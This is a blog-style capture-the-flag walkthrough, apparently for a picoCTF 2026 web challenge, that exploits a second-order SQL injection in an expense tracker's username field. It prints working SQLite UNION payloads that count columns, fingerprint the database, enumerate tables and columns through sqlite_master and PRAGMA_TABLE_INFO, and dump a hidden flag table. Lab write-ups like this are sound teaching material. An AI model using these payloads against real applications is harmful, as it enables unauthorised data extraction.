---
title: ORDER ORDER
date: 2026-03-22 14:52:17 
categories: [ctf, picoctf, "2026", web explotation, walkthrough]
tag: [picoctf, web explotation, medium, sql injection, sqlite3, Second-Order SQL Injection]
---
![](/assets/ORDER-ORDER/images/description.png)

# Web Recon
The application serves as an expense tracking system with user registration and authentication.
![](/assets/ORDER-ORDER/images/initial_access.png)

After logging in, users can add expenses and generate a downloadable CSV report.

![](/assets/ORDER-ORDER/images/expenses.png)


![](/assets/ORDER-ORDER/images/report.png)


# Vulnerability Discovery (Second-Order SQLi)
Initial testing for SQL injection by injecting a single quote (`'`) into various input fields revealed an error-based vulnerability specifically within the **username** field.
We identified that the username is stored in the database without sanitization and later used in a dynamic query when generating reports.

![](/assets/ORDER-ORDER/images/report_error.png)

# Exploitation (Data Enumeration)

**Determining Column Count** Using `ORDER BY`, we determined the number of columns expected by the report generator:
```sql
insane' order by 10-- -
```

![](/assets/ORDER-ORDER/images/report_columns.png)

**Fingerprinting the Database** We used a `UNION SELECT` statement to identify the database version.
```sql
insane' union select 1,2,sqlite_version()-- -
```

```csv
# Download generated report
# Got sqlite version: 3.31.1
❯ cat sql.csv
description,amount,date
1,2,3.31.1
```

**Table Enumeration** We queried the `sqlite_master` table to list all accessible tables:
```sql
insane' union select 1,2,tbl_name FROM sqlite_master WHERE type='table'-- -
```
A suspicious table named `aDNyM19uMF9mMTRn` was found.
```csv
❯ cat sql.csv
description,amount,date
1,2,aDNyM19uMF9mMTRn
1,2,expenses
1,2,inbox
1,2,reports
1,2,sqlite_sequence
1,2,users
```

**Column Enumeration** To understand the structure of the suspicious table, we used the `PRAGMA_TABLE_INFO` function:
```sql
insane' union select 1,2,name from PRAGMA_TABLE_INFO('aDNyM19uMF9mMTRn')-- -
```

```csv
❯ cat /tmp/sql.csv
description,amount,date
1,2,name
1,2,value
```

**Data Exfiltration** Finally, we crafted a payload to dump the contents of the hidden table into our generated report:
```sql
insane' union select 1,name,value FROM 'aDNyM19uMF9mMTRn'-- -
```

```sql
 ❯ cat /tmp/sql.csv
description,amount,date
1,flag,picoCTF{s3c0nd_0rd3r_XXXXXXXXX}
```
